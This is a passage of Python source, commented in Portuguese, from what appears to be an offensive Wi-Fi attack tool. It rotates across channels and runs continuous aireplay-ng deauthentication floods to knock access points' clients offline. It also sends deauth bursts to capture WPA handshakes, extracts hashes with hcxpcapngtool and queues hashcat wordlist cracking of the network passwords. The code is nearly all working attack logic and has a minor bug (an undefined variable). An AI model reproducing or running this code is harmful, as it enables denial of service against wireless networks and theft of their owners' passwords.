    def capturar_infinito(self, bssid: str, canal: int = 0,
                          stop_event: Optional[threading.Event] = None,
                          on_tentativa=None) -> Optional[Path]:
        """Captura cirúrgica de handshake — v1.5.5

        Fluxo robusto:
          1) Sem canal definido → aborta (avisa pra re-escanear via NMCLI).
          2) Trava iface no canal do AP via `iw set channel`.
          3) Sobe airodump-ng escutando o BSSID. Reinicia se morrer.
          4) Loop: re-trava canal (vermelha em outro canal pode ter roubado),
             dispara burst de 30 `--deauth` (não 0/infinito — burst finito é
             mais limpo aqui), espera 10s pro 4-way handshake aparecer, e
             checa via **hcxpcapngtool** (mesma ferramenta da conversão —
             zero falso positivo: se ela extrai, hashcat crackeia).
          5) Cancelável via stop_event. Nunca propaga exception.
        """
        if not (HAS_AIRODUMP and HAS_AIREPLAY):
            self.ui.error("  ✗ airodump-ng e aireplay-ng são necessários.")
            return None
        canal_alvo = int(canal) if canal and str(canal).strip() not in ("?", "") else 0
        if not canal_alvo:
            self.ui.error(f"  ✗ {bssid}: canal desconhecido. Re-escaneie via NMCLI "
                          "antes de mover pra zona azul.")
            try: emitir("handshake_log", bssid=bssid,
                          msg="canal desconhecido — abortando")
            except Exception: pass
            return None

        nome = bssid.replace(":", "")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        base = HANDSHAKE_DIR / f"hs_{nome}_{ts}"
        cap_file = Path(str(base) + "-01.cap")

        def _trava_canal():
            if not HAS_IW:
                return
            try:
                subprocess.run(["iw", "dev", self.iface, "set", "channel",
                                 str(canal_alvo)],
                                timeout=3, check=False,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
            except Exception:
                pass

        def _spawn_airodump():
            cmd = ["airodump-ng", "--bssid", bssid,
                   "--channel", str(canal_alvo),
                   "-w", str(base), "--output-format", "cap",
                   self.iface]
            return subprocess.Popen(cmd,
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)

        _trava_canal()
        try:
            p_dump = _spawn_airodump()
        except Exception as e:
            self.ui.error(f"  ✗ airodump-ng não subiu: {e}")
            try: emitir("handshake_log", bssid=bssid,
                          msg=f"airodump não subiu: {e}")
            except Exception: pass
            return None
        time.sleep(2.0)
        self.ui.info(f"  airodump escutando {bssid} ch{canal_alvo}")
        try: emitir("handshake_log", bssid=bssid,
                      msg=f"airodump ch{canal_alvo} OK")
        except Exception: pass

        tentativa = 0
        try:
            while True:
                if stop_event is not None and stop_event.is_set():
                    self.ui.warn(f"  Captura {bssid} cancelada pelo usuário")
                    return None
                tentativa += 1
                if on_tentativa:
                    try: on_tentativa(1, tentativa)
                    except Exception: pass

                # Re-trava canal (zona vermelha em canal diferente pode ter
                # mexido a iface entre tentativas)
                _trava_canal()

                # Garante airodump vivo
                if p_dump.poll() is not None:
                    self.ui.warn(f"  airodump morreu, reiniciando…")
                    try: emitir("handshake_log", bssid=bssid,
                                  msg="airodump morreu — restart")
                    except Exception: pass
                    try:
                        p_dump = _spawn_airodump()
                    except Exception as e:
                        self.ui.error(f"  ✗ airodump não reiniciou: {e}")
                        return None
                    time.sleep(2.0)

                self.ui.info(f"  ↻ {bssid} ch{canal_alvo} — burst #{tentativa} "
                              f"(30 deauths)")
                try: emitir("handshake_log", bssid=bssid,
                              msg=f"burst #{tentativa} ch{canal_alvo}")
                except Exception: pass

                # Burst finito de 30 deauths — mais limpo que --deauth 0
                try:
                    subprocess.run(["aireplay-ng", "-0", "30",
                                     "--ignore-negative-one",
                                     "-a", bssid, self.iface],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL, timeout=20)
                except Exception as _e:
                    self.ui.warn(f"  aireplay falhou no burst #{tentativa}: {_e}")

                # Espera 10s pro 4-way handshake completar e ser gravado
                for _ in range(10):
                    if stop_event is not None and stop_event.wait(1.0):
                        return None
                    elif stop_event is None:
                        time.sleep(1.0)

                # Detecção rigorosa via hcxpcapngtool (mesma do pipeline
                # de conversão). Se ela conseguir extrair → hashcat crackeia.
                if cap_file.exists():
                    tamanho = cap_file.stat().st_size
                    tem = self._cap_tem_handshake(cap_file, bssid)
                    self.ui.info(f"  cap={tamanho}B handshake_real={tem}")
                    try: emitir("handshake_log", bssid=bssid,
                                  msg=f"cap {tamanho}B handshake={tem}")
                    except Exception: pass
                    if tem:
                        self.ui.success(f"  ✓ Handshake REAL capturado em "
                                          f"{tentativa} bursts: {cap_file.name}")
                        return cap_file
                else:
                    self.ui.warn(f"  cap_file ainda inexistente: {cap_file}")
                    try: emitir("handshake_log", bssid=bssid,
                                  msg="cap_file inexistente — airodump falhando?")
                    except Exception: pass

                if not HANDSHAKE_RETRY_FOREVER and tentativa >= 30:
                    self.ui.warn(f"  Limite de {tentativa} tentativas atingido")
                    return None
        finally:
            try: p_dump.terminate()
            except Exception: pass
            try: p_dump.wait(timeout=3)
            except Exception:
                try: p_dump.kill()
                except Exception: pass

    @staticmethod
    def _cap_tem_handshake(cap_file: Path, bssid: str) -> bool:
        """Detecção rigorosa: usa **hcxpcapngtool** (mesma ferramenta da
        conversão pra hashcat). Se ela conseguir extrair um .22000 não-vazio,
        hashcat vai crackear. Sem ambiguidade. Fallback aircrack-ng se hcx
        ausente. EAPOL>=2 via scapy NÃO é mais usado — gerava falso positivo."""
        try:
            tamanho = cap_file.stat().st_size
        except Exception:
            return False
        if tamanho <= 24:
            return False
        # Caminho ideal: hcxpcapngtool — match perfeito com etapa de conversão
        if HAS_HCXPCAPNGTOOL:
            tool = shutil.which("hcxpcapngtool") or shutil.which("hcxpcaptool")
            test_22000 = cap_file.with_suffix(".test.22000")
            try:
                subprocess.run([tool, "-o", str(test_22000), str(cap_file)],
                                capture_output=True, text=True, timeout=10)
                if test_22000.exists() and test_22000.stat().st_size > 0:
                    return True
            except Exception:
                pass
            finally:
                if test_22000.exists():
                    try: test_22000.unlink()
                    except Exception: pass
            # hcxpcapngtool rodou mas não extraiu → SEM handshake
            return False
        # Fallback usando scapy para contar EAPOLs (mais confiável que aircrack-ng sem wordlist)
        try:
            import scapy.all as scapy
            pkts = scapy.rdpcap(str(cap_file))
            eapol_count = sum(1 for p in pkts if p.haslayer(scapy.EAPOL))
            # Hashcat consegue quebrar com os frames 1 e 2.
            if eapol_count >= 2:
                print(f"DEBUG EAPOL COUNT: {eapol_count} (APROVADO)")
                return True
            else:
                print(f"DEBUG EAPOL COUNT: {eapol_count} (REJEITADO - menos de 2)")
        except Exception as e:
            print(f"DEBUG SCAPY EXCEPTION: {e}")
            pass
        
        return False


# ══════════════════ CARROSSEL DE CANAL ═════════════════════════
# Orquestrador single-thread que rotaciona entre os canais com APs ativos
# em vermelha+azul. Cada slot trava um canal, sobe airodump (se há azul) e
# aireplay --deauth 0 pra cada AP (vermelha + azul) daquele canal. Após o
# tempo do slot: mata processos, checa cap pra handshakes, próximo canal.
# Resolve o conflito fundamental "1 placa = 1 canal" sem precisar de N
# placas wifi. Single-thread = zero race condition, zero starvation.

class CarrosselCanal:
    """Orquestrador de ataque por canal — slots rotativos.
    Funciona com qualquer N de APs (1 a 100+) sem travar."""

    def __init__(self, engine: "KamikaseEngine"):
        self.eng = engine
        self.slot_vermelha = CARROSSEL_SLOT_VERMELHA_S
        self.slot_azul = CARROSSEL_SLOT_AZUL_S
        self.thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        # Estado público (lido pelo /api/carrossel/status e emit tick)
        self.canal_atual: Optional[int] = None
        self.canal_inicio: float = 0.0
        self.canal_slot_s: int = 0
        self.canais_pendentes: List[int] = []
        # Modo infinito: trava em UM canal só, não rotaciona
        self.modo_infinito = False
        self.canal_lockado: Optional[int] = None

    def set_slot_azul(self, segundos: int = 10, infinito: bool = False,
                        canal_lock: Optional[int] = None) -> None:
        """Configura duração do slot da zona azul (captura handshake).
        Se infinito=True, trava em UM canal igual à vermelha. Default 10s.
        Slots maiores aumentam chance de pegar handshake de clientes lentos
        (TVs, IoT). Slots menores rodam mais ciclos por minuto."""
        if infinito:
            self.modo_infinito = True
            if canal_lock is None:
                grupos = self._agrupar_por_canal()
                for ch in sorted(grupos.keys()):
                    if grupos[ch]["vermelha"] or grupos[ch]["azul"]:
                        canal_lock = ch
                        break
            self.canal_lockado = canal_lock
            self.eng.ui.warn(f"🔒 Modo infinito (azul): travado em ch{canal_lock or '?'}")
        else:
            self.modo_infinito = False
            self.canal_lockado = None
            self.slot_azul = max(5, int(segundos))
            self.eng.ui.info(f"⏱ Slot azul: {self.slot_azul}s")
        try: emitir("carrossel_config",
                     slot_vermelha=self.slot_vermelha,
                     slot_azul=self.slot_azul,
                     infinito=self.modo_infinito,
                     canal_lockado=self.canal_lockado)
        except Exception: pass

    def set_slot_vermelha(self, segundos: int = 15, infinito: bool = False,
                            canal_lock: Optional[int] = None) -> None:
        """Configura duração do slot da zona vermelha. Se infinito=True,
        trava em UM canal e não rotaciona (modo lock-on-channel).
        Default canal_lock = primeiro canal com AP em vermelha."""
        if infinito:
            self.modo_infinito = True
            if canal_lock is None:
                grupos = self._agrupar_por_canal()
                for ch in sorted(grupos.keys()):
                    if grupos[ch]["vermelha"] or grupos[ch]["azul"]:
                        canal_lock = ch
                        break
            self.canal_lockado = canal_lock
            self.eng.ui.warn(f"🔒 Modo infinito: travado em ch{canal_lock or '?'}")
        else:
            self.modo_infinito = False
            self.canal_lockado = None
            self.slot_vermelha = max(5, int(segundos))
            self.eng.ui.info(f"⏱ Slot vermelha: {self.slot_vermelha}s")
        try: emitir("carrossel_config",
                     slot_vermelha=self.slot_vermelha,
                     slot_azul=self.slot_azul,
                     infinito=self.modo_infinito,
                     canal_lockado=self.canal_lockado)
        except Exception: pass

    def iniciar(self) -> None:
        with self.lock:
            if self.thread and self.thread.is_alive():
                return
            self.stop_event.clear()
            self.thread = threading.Thread(target=self._loop, daemon=True,
                                            name="carrossel-canal")
            self.thread.start()
        # Limpa slot caps órfãos de execuções anteriores que crasharam
        try:
            if SLOT_TEMP_DIR.exists():
                for f in SLOT_TEMP_DIR.iterdir():
                    try: f.unlink()
                    except Exception: pass
        except Exception: pass
        self.eng.ui.info("🔄 Carrossel de canal iniciado")
        try: emitir("carrossel_status", ativo=True)
        except Exception: pass

    def parar(self) -> None:
        self.stop_event.set()
        t = self.thread
        if t:
            t.join(timeout=3)
        with self.lock:
            self.thread = None
            self.canal_atual = None
        try: emitir("carrossel_status", ativo=False)
        except Exception: pass

    def status(self) -> Dict[str, Any]:
        with self.lock:
            elapsed = int(time.time() - self.canal_inicio) if self.canal_inicio else 0
            restante = max(0, self.canal_slot_s - elapsed)
            return {
                "ativo": bool(self.thread and self.thread.is_alive()),
                "canal_atual": self.canal_atual,
                "slot_s": self.canal_slot_s,
                "restante_s": restante,
                "canais_pendentes": list(self.canais_pendentes),
            }

    # ─── lógica interna ─────────────────────────────────────────

    def _agrupar_por_canal(self) -> Dict[int, Dict[str, List[Dict[str, Any]]]]:
        """Lê estado vivo das zonas e agrupa APs ativos (vermelha+azul) por
        canal. APs azul que JÁ têm handshake_path são pulados (carrossel
        não captura de novo). Idempotente."""
        eng = self.eng
        grupos: Dict[int, Dict[str, List[Dict[str, Any]]]] = {}
        with eng.zonas_lock:
            for bssid in list(eng.zonas.get("vermelha", [])):
                ap = next((a for a in eng.alvos if a["bssid"] == bssid), None)
                if not ap: continue
                ch = ap.get("canal")
                if ch in (None, "", "?"): continue
                try: ch = int(ch)
                except Exception: continue
                grupos.setdefault(ch, {"vermelha": [], "azul": []})["vermelha"].append(ap)
            for bssid in list(eng.zonas.get("azul", [])):
                ap = next((a for a in eng.alvos if a["bssid"] == bssid), None)
                if not ap: continue
                if ap.get("handshake_path"):
                    continue
                ch = ap.get("canal")
                if ch in (None, "", "?"): continue
                try: ch = int(ch)
                except Exception: continue
                grupos.setdefault(ch, {"vermelha": [], "azul": []})["azul"].append(ap)
        return grupos

    def _loop(self) -> None:
        eng = self.eng
        while not self.stop_event.is_set():
            grupos = self._agrupar_por_canal()
            if not grupos:
                with self.lock:
                    self.canal_atual = None
                    self.canais_pendentes = []
                if self.stop_event.wait(2.0):
                    break
                continue
            canais = sorted(grupos.keys())
            with self.lock:
                self.canais_pendentes = list(canais)

            # MODO INFINITO: trava em UM canal só, não rotaciona
            if self.modo_infinito:
                # Se canal_lockado vazio ou inválido, escolhe o primeiro com APs
                if self.canal_lockado not in grupos:
                    self.canal_lockado = canais[0] if canais else None
                if self.canal_lockado is None:
                    if self.stop_event.wait(2.0): break
                    continue
                grupo = grupos.get(self.canal_lockado, {"vermelha": [], "azul": []})
                if not (grupo["vermelha"] or grupo["azul"]):
                    if self.stop_event.wait(2.0): break
                    continue
                slot_s = self.slot_azul if grupo["azul"] else self.slot_vermelha
                try:
                    self._executar_slot(self.canal_lockado, grupo, slot_s)
                except Exception as e:
                    eng.ui.warn(f"Slot infinito ch{self.canal_lockado} falhou: {e}")
                continue

            # MODO NORMAL: rotaciona entre canais
            for canal in canais:
                if self.stop_event.is_set(): break
                grupo = grupos.get(canal, {"vermelha": [], "azul": []})
                if not (grupo["vermelha"] or grupo["azul"]):
                    continue
                slot_s = self.slot_azul if grupo["azul"] else self.slot_vermelha
                try:
                    self._executar_slot(canal, grupo, slot_s)
                except Exception as e:
                    eng.ui.warn(f"Slot ch{canal} falhou: {e}")

    def _executar_slot(self, canal: int,
                         grupo: Dict[str, List[Dict[str, Any]]],
                         slot_s: int) -> None:
        eng = self.eng
        iface = eng.iface_monitor
        if not iface:
            return

        if HAS_IW:
            try:
                subprocess.run(
                    ["iw", "dev", iface, "set", "channel", str(canal)],
                    timeout=3, check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            except Exception:
                pass

        with self.lock:
            self.canal_atual = canal
            self.canal_inicio = time.time()
            self.canal_slot_s = slot_s

        try:
            emitir("carrossel_slot", canal=canal,
                   vermelha=len(grupo["vermelha"]),
                   azul=len(grupo["azul"]),
                   slot_s=slot_s)
        except Exception:
            pass

        eng.ui.info(
            f"🔄 Slot ch{canal} · {len(grupo['vermelha'])} vermelha "
            f"+ {len(grupo['azul'])} azul · {slot_s}s"
        )

        p_dump: Optional[subprocess.Popen] = None
        cap_file: Optional[Path] = None
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        azul_bssids = [ap["bssid"] for ap in grupo["azul"]]
        if grupo["azul"] and HAS_AIRODUMP:
            try:
                SLOT_TEMP_DIR.mkdir(parents=True, exist_ok=True)
            except Exception:
                pass
            cap_base = SLOT_TEMP_DIR / f"slot_ch{canal}_{ts}"
            try:
                cmd_dump = [
                    "airodump-ng", "--channel", str(canal),
                    "-w", str(cap_base), "--output-format", "cap",
                    "--write-interval", "1", iface,
                ]
                if len(azul_bssids) == 1:
                    cmd_dump = [
                        "airodump-ng", "--bssid", azul_bssids[0],
                        "--channel", str(canal),
                        "-w", str(cap_base), "--output-format", "cap",
                        "--write-interval", "1", iface,
                    ]
                p_dump = subprocess.Popen(
                    cmd_dump,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                cap_file = Path(str(cap_base) + "-01.cap")
                time.sleep(CARROSSEL_AIRODUMP_BOOT_S)
            except Exception as e:
                eng.ui.warn(f"  airodump não subiu: {e}")
                p_dump = None
                cap_file = None

        # v1.6.0: COMPORTAMENTO DIFERENCIADO POR ZONA
        # Vermelha = derrubar = aireplay --deauth 0 contínuo (Popen background)
        # Azul = capturar = bursts periódicos com janela de escuta (subprocess.run)
        # Razão: cliente PRECISA de tempo silencioso pra reconectar e completar
        # o 4-way handshake. Deauth contínuo impede a reconexão.
        procs: List[Tuple[str, subprocess.Popen, str]] = []
        aps_alvo = grupo["vermelha"] + grupo["azul"]
        zona_corrente = "azul" if grupo["azul"] else ("vermelha" if grupo["vermelha"] else "")

        # Inicialização das métricas + status azul
        if zona_corrente == "azul":
            for ap in aps_alvo:
                ap["carrossel_ciclos"] = ap.get("carrossel_ciclos", 0) + 1
                ap["carrossel_tempo_acumulado_s"] = (
                    ap.get("carrossel_tempo_acumulado_s", 0) + slot_s
                )
                ap["crack"] = {
                    "status": "capturing",
                    "progresso": 0.0,
                    "eta": "?",
                    "tentativa": ap["carrossel_ciclos"],
                    "tempo_acumulado_s": ap["carrossel_tempo_acumulado_s"],
                }
                emitir("ap_update", **ap)
                try: emitir("handshake_log", bssid=ap["bssid"],
                              msg=f"▶ ciclo #{ap['carrossel_ciclos']} ch{canal} · "
                                    f"burst pattern ({CARROSSEL_AZUL_BURST_PKTS}pkts/{CARROSSEL_AZUL_LISTEN_S}s)")
                except Exception: pass

        # Vermelha: spawn aireplay --deauth 0 contínuo (Popen) — fica firing
        if zona_corrente == "vermelha" and HAS_AIREPLAY:
            for ap in aps_alvo:
                bssid = ap["bssid"]
                try:
                    p = subprocess.Popen(
                        ["aireplay-ng", "--deauth", "0", "--ignore-negative-one",
                         "-a", bssid, iface],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    procs.append((bssid, p, "vermelha"))
                except Exception as e:
                    eng.ui.warn(f"  aireplay {bssid} falhou: {e}")

        inicio = time.time()
        # Azul: state pra burst-listen pattern
        proxima_burst_em_s = 0.0       # primeiro burst em t=0
        burst_count_azul = 0
        burst_intervalo = float(CARROSSEL_AZUL_LISTEN_S + 1)  # +1s pro burst rodar

        while time.time() - inicio < slot_s:
            if self.stop_event.is_set():
                break
            elapsed = time.time() - inicio
            restante = max(0, slot_s - int(elapsed))

            # Azul: dispara burst quando a janela de escuta termina
            if zona_corrente == "azul" and HAS_AIREPLAY and elapsed >= proxima_burst_em_s:
                burst_count_azul += 1
                eng.ui.info(f"  💥 ch{canal} burst #{burst_count_azul} "
                              f"({CARROSSEL_AZUL_BURST_PKTS} deauths) → "
                              f"escutando {CARROSSEL_AZUL_LISTEN_S}s")
                for ap in aps_alvo:
                    bssid = ap["bssid"]
                    try:
                        # Burst FINITO síncrono (~1s) — kick + retorna
                        subprocess.run(
                            ["aireplay-ng", "-0", str(CARROSSEL_AZUL_BURST_PKTS),
                             "--ignore-negative-one", "-a", bssid, iface],
                            timeout=5,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                        with eng.contador_lock:
                            eng.contador_global += CARROSSEL_AZUL_BURST_PKTS
                            eng.contador_por_bssid[bssid] = (
                                eng.contador_por_bssid.get(bssid, 0)
                                + CARROSSEL_AZUL_BURST_PKTS
                            )
                    except Exception:
                        pass
                proxima_burst_em_s = elapsed + burst_intervalo
                try:
                    for ap in aps_alvo:
                        emitir("handshake_log", bssid=ap["bssid"],
                                msg=f"💥 burst #{burst_count_azul} disparado · escuta {CARROSSEL_AZUL_LISTEN_S}s ON")
                except Exception: pass

            # Contadores vermelha (~64/s por aireplay vivo)
            for bssid, p, _zona in procs:
                if p.poll() is not None:
                    continue
                with eng.contador_lock:
                    eng.contador_global += 64
                    eng.contador_por_bssid[bssid] = eng.contador_por_bssid.get(bssid, 0) + 64

            try:
                with self.lock:
                    pendentes = list(self.canais_pendentes)
                emitir("carrossel_tick", canal=canal, restante_s=restante,
                        slot_s=slot_s, ativo=True, canais_pendentes=pendentes,
                        zona_corrente=zona_corrente,
                        burst_count=burst_count_azul if zona_corrente == "azul" else None)
            except Exception:
                pass

            for ap in aps_alvo:
                ap["pacotes"] = eng.contador_por_bssid.get(ap["bssid"], 0)
                ap["carrossel_canal"] = canal
                ap["carrossel_slot_restante"] = restante
                if zona_corrente == "azul":
                    ap["azul_burst_count"] = burst_count_azul
                    # Indicador "fase atual": disparando burst ou escutando
                    fase = "burst" if elapsed < (proxima_burst_em_s - CARROSSEL_AZUL_LISTEN_S) else "escutando"
                    ap["azul_fase"] = fase
                emitir("ap_update", **ap)

            if self.stop_event.wait(1.0):
                break

        # Termina aireplays de uma vez
        for _bssid, p, _zona in procs:
            try: p.terminate()
            except Exception: pass
        for _bssid, p, _zona in procs:
            try: p.wait(timeout=1)
            except Exception:
                try: p.kill()
                except Exception: pass

        # Termina airodump e dá flush time pro cap aterrissar antes da validação
        if p_dump:
            try: p_dump.terminate()
            except Exception: pass
            try: p_dump.wait(timeout=2)
            except Exception:
                try: p_dump.kill()
                except Exception: pass
            time.sleep(CARROSSEL_AZUL_FLUSH_S)
            if cap_file and cap_file.exists():
                tamanho = cap_file.stat().st_size
                eng.ui.info(
                    f"  📥 cap ch{canal}: {tamanho}B — validando "
                    f"{len(grupo['azul'])} AP(s) azul…"
                )
                try:
                    emitir("handshake_log", bssid=f"ch{canal}",
                           msg=f"cap {tamanho}B, validando {len(grupo['azul'])} AP(s)")
                except Exception:
                    pass
                if tamanho > 24:
                    for ap in grupo["azul"]:
                        try:
                            self._validar_e_extrair_handshake_azul(cap_file, ap)
                        except Exception as e:
                            eng.ui.warn(f"  validar {ap['bssid']} falhou: {e}")
                else:
                    eng.ui.warn(f"  cap inválido ({tamanho}B) — pulando")
            else:
                eng.ui.warn(f"  cap não encontrado em {cap_file} — airodump pode ter falhado")
            for f in SLOT_TEMP_DIR.glob(f"slot_ch{canal}_{ts}*"):
                try:
                    f.unlink()
                except Exception:
                    pass

        for ap in grupo["vermelha"] + grupo["azul"]:
            ap.pop("carrossel_slot_restante", None)
            emitir("ap_update", **ap)

    def _validar_e_extrair_handshake_azul(self, slot_cap: Path,
                                              ap: Dict[str, Any]) -> bool:
        """Tenta extrair handshake DESTE BSSID do slot cap usando
        `hcxpcapngtool --apmac=<MAC>` (filtro nativo). Se gera .22000
        não-vazio: handshake real → copia tudo pra `handshakes/azul/<BSSID>/`
        e enfileira hashcat. Idempotente."""
        eng = self.eng
        bssid = ap["bssid"]
        ap_dir = AZUL_DIR / bssid.replace(":", "")
        try:
            ap_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            eng.ui.warn(f"  mkdir {ap_dir} falhou: {e}")
            return False

        # Sem hcxpcapngtool não dá pra filtrar por BSSID com .22000 —
        # usamos contagem de EAPOL via scapy como fallback.
        if not HAS_HCXPCAPNGTOOL:
            eng.ui.info(f"  🔍 {bssid} scapy fallback (sem hcxpcapngtool)...")
            tem = PMKIDCapture._cap_tem_handshake(slot_cap, bssid)
            eng.ui.info(f"  {bssid} scapy validator: {'HANDSHAKE VÁLIDO' if tem else 'sem handshake completo'}")
            try: emitir("handshake_log", bssid=bssid,
                          msg=f"fallback validator: {'HANDSHAKE VÁLIDO' if tem else 'incompleto'}")
            except Exception: pass
            if tem:
                cap_dest = ap_dir / "handshake.cap"
                try:
                    shutil.copy(str(slot_cap), str(cap_dest))
                    ap["handshake_path"] = str(cap_dest)
                    ap["handshake_em"] = datetime.now().isoformat()
                    if eng.memoria:
                        try: eng.memoria.registrar_handshake(bssid, ap.get("essid", ""), cap_dest)
                        except Exception: pass
                    emitir("handshake_capturado", bssid=bssid, pcap=str(cap_dest))
                    eng.ui.success(f"  ✓ Handshake capturado: {bssid} ({ap.get('essid','?')}) → {ap_dir}")
                    self._enfileirar_hashcat_azul(ap, cap_dest, None)
                    return True
                except Exception as e:
                    eng.ui.warn(f"  copy cap falhou: {e}")
                    return False
            return False

        tool = shutil.which("hcxpcapngtool") or shutil.which("hcxpcaptool")
        out_22000 = ap_dir / "handshake.22000"
        temp_22000 = ap_dir / "temp_all.22000"
        
        try:
            if out_22000.exists(): out_22000.unlink()
            if temp_22000.exists(): temp_22000.unlink()
        except Exception: pass

        saida = ""
        try:
            # hcxpcapngtool moderno não tem --apmac, extrai tudo primeiro
            r = subprocess.run([tool, "-o", str(temp_22000), str(slot_cap)],
                                capture_output=True, text=True, timeout=15)
            saida = ((r.stdout or "") + (r.stderr or ""))[:200].replace('\n', ' | ')
            
            if temp_22000.exists() and temp_22000.stat().st_size > 0:
                hashtool = shutil.which("hcxhashtool")
                if hashtool:
                    apmac = bssid.replace(":", "").lower()
                    r2 = subprocess.run([hashtool, "-i", str(temp_22000), f"--mac-ap={apmac}", "-o", str(out_22000)],
                                        capture_output=True, text=True, timeout=10)
                else:
                    # Sem hcxhashtool, aceita tudo (arriscado se houver múltiplos APs, mas salva a captura)
                    shutil.copy(str(temp_22000), str(out_22000))
        except Exception as e:
            saida = str(e)
            eng.ui.warn(f"  extração hcx falhou: {e}")
        finally:
            try:
                if temp_22000.exists(): temp_22000.unlink()
            except Exception: pass

        existe = out_22000.exists()
        tamanho_22000 = out_22000.stat().st_size if existe else 0
        eng.ui.info(f"  🔍 {bssid} hcx_out={tamanho_22000}B → "
                      f"{'✓ HANDSHAKE' if tamanho_22000 > 0 else '✗ vazio'}")
        try: emitir("handshake_log", bssid=bssid,
                      msg=f"hcx={tamanho_22000}B {'✓' if tamanho_22000 > 0 else '✗ sem hash'}")
        except Exception: pass

        if not existe or tamanho_22000 == 0:
            if houve_erro and saida:
                eng.ui.warn(f"  hcxpcapngtool falhou pra {bssid}: {saida}")
                try: emitir("handshake_log", bssid=bssid,
                              msg=f"hcxpcapngtool error: {saida}")
                except Exception: pass
            # Sem handshake pra ESTE BSSID — limpa arquivo vazio e segue
            if existe:
                try: out_22000.unlink()
                except Exception: pass
            return False

        # SUCESSO: copia o cap inteiro pra pasta do AP
        cap_dest = ap_dir / "handshake.cap"
        try:
            shutil.copy(str(slot_cap), str(cap_dest))
        except Exception as e:
            eng.ui.warn(f"  copy cap falhou: {e}")
            return False

        ap["handshake_path"] = str(cap_dest)
        ap["hash_path"] = str(out_22000)
        ap["handshake_em"] = datetime.now().isoformat()

        # Persiste na memória (db.json)
        if eng.memoria:
            try: eng.memoria.registrar_handshake(bssid, ap.get("essid", ""), cap_dest)
            except Exception: pass

        emitir("handshake_capturado", bssid=bssid, pcap=str(cap_dest),
                hash_22000=str(out_22000))
        eng.ui.success(f"  ✓ Handshake REAL: {bssid} ({ap.get('essid','?')}) "
                          f"→ {ap_dir}")

        # Enfileira hashcat
        self._enfileirar_hashcat_azul(ap, cap_dest, out_22000)
        return True

    def _enfileirar_hashcat_azul(self, ap: Dict[str, Any],
                                   cap_dest: Path,
                                   hash_22000: Optional[Path]) -> None:
        eng = self.eng
        bssid = ap["bssid"]
        wls = ap.get("crack_wordlists") or []
        if not (wls and eng.hashcat_worker):
            ap["crack"] = {"status": "captured_no_wl",
                            "erro": "handshake pego — configure wordlists",
                            "progresso": 0.0, "eta": "?"}
            emitir("ap_update", **ap)
            return
        wl_paths: List[Path] = []
        for w in wls:
            wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
            if wp.exists():
                wl_paths.append(wp)
        if not wl_paths:
            ap["crack"] = {"status": "wordlist_missing",
                            "erro": "wordlists não encontradas",
                            "progresso": 0.0, "eta": "?"}
            emitir("ap_update", **ap)
            return
        ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?",
                        "wordlists": [p.name for p in wl_paths]}
        emitir("ap_update", **ap)
        try:
            eng.hashcat_worker.enfileirar(
                bssid=bssid, essid=ap.get("essid", ""),
                pcapng=cap_dest,
                perfil=ap.get("crack_perfil", "low"),
                wordlists=wl_paths,
                contextual=True)
        except Exception as e:
            eng.ui.warn(f"  enfileirar hashcat falhou: {e}")

    def _registrar_handshake_azul(self, ap: Dict[str, Any], cap_file: Path) -> None:
        """Persiste handshake do AP azul, registra na memória, enfileira no
        hashcat se há wordlists configuradas. Idempotente."""
        eng = self.eng
        bssid = ap["bssid"]
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        nome = bssid.replace(":", "")
        novo_cap = HANDSHAKE_DIR / f"hs_{nome}_{ts}.cap"
        try:
            shutil.copy(str(cap_file), str(novo_cap))
        except Exception:
            novo_cap = cap_file
        if eng.memoria:
            try:
                pcap_persistido = eng.memoria.registrar_handshake(
                    bssid, ap.get("essid", ""), novo_cap)
                ap["handshake_path"] = str(pcap_persistido)
                novo_cap = pcap_persistido
            except Exception:
                ap["handshake_path"] = str(novo_cap)
        else:
            ap["handshake_path"] = str(novo_cap)
        ap["handshake_em"] = datetime.now().isoformat()
        try: emitir("handshake_capturado", bssid=bssid, pcap=str(novo_cap))
        except Exception: pass
        eng.ui.success(f"  ✓ Handshake capturado: {bssid} ({ap.get('essid','?')})")
        # Enfileira no hashcat se já tem wordlists
        wls = ap.get("crack_wordlists") or []
        if wls and eng.hashcat_worker:
            wl_paths: List[Path] = []
            for w in wls:
                wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
                if wp.exists():
                    wl_paths.append(wp)
            if wl_paths:
                ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?",
                                "wordlists": [p.name for p in wl_paths]}
                emitir("ap_update", **ap)
                try:
                    eng.hashcat_worker.enfileirar(
                        bssid=bssid, essid=ap.get("essid", ""),
                        pcapng=Path(ap["handshake_path"]),
                        perfil=ap.get("crack_perfil", "low"),
                        wordlists=wl_paths,
                        contextual=True)
                except Exception as e:
                    eng.ui.warn(f"  enfileirar hashcat falhou: {e}")
        else:
            ap["crack"] = {"status": "captured_no_wl",
                            "erro": "handshake pego — configure wordlists",
                            "progresso": 0.0, "eta": "?"}
            emitir("ap_update", **ap)


# ══════════════════ MEMÓRIA PERSISTENTE ═══════════════════════
# Tudo local em ./memoria/. Mantém estado entre sessões: APs vistos,
# handshakes capturados, senhas quebradas, histórico de zonas.
# Apaga só se o usuário quiser (botão no dashboard ou rm manual).

class MemoriaPersistente:
    """JSON-based local storage. Single file db.json + pasta handshakes/."""

    DIR_BASE = Path("memoria")
    DIR_HANDSHAKES = DIR_BASE / "handshakes"
    PATH_DB = DIR_BASE / "db.json"

    def __init__(self):
        self.DIR_BASE.mkdir(parents=True, exist_ok=True)
        self.DIR_HANDSHAKES.mkdir(parents=True, exist_ok=True)
        self.lock = threading.Lock()
        self.dados: Dict[str, Any] = {
            "version": VERSION,
            "criado_em": datetime.now().isoformat(),
